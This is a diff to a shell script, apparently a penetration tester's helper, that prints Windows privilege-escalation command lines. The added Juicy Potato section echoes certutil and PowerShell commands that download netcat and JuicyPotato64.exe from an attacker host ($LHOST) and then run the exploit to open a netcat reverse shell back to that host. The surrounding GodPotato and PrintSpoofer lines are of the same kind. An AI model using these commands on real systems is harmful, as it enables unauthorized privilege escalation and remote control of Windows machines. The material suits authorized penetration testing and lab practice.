@@ -73,6 +73,16 @@ echo "iwr -uri http://$LHOST:$TOOLS_PORT/windows/exploits/GodPotato-NET4.exe -Ou
 echo "C:\Windows\Temp\GodPotato.exe -cmd \"C:\Windows\Temp\nc.exe -t -e C:\Windows\System32\cmd.exe $LHOST $LPORT\""
 echo
 echo
+echo "=== Juicy Potato ==="
+echo
+echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/windows/nc64.exe C:\Windows\Temp\nc.exe"
+echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/windows/exploits/JuicyPotato64.exe C:\Windows\Temp\JuicyPotato64.exe"
+echo
+echo "iwr -uri http://$LHOST:$TOOLS_PORT/windows/nc64.exe -Outfile C:\Windows\Temp\nc.exe"
+echo "iwr -uri http://$LHOST:$TOOLS_PORT/windows/exploits/JuicyPotato64.exe -Outfile C:\Windows\Temp\JuicyPotato64.exe"
+echo
+echo "C:\Windows\Temp\JuicyPotato64.exe -l 53375 -p C:\windows\system32\cmd.exe -a \"/c C:\Windows\Temp\nc.exe $LHOST $LPORT -e cmd.exe\" -t *"
+echo
 echo "=== PrintSpoofer ==="
 echo
 echo "certutil.exe -urlcache -f http://$LHOST:$TOOLS_PORT/windows/nc64.exe C:\Windows\Temp\nc.exe"
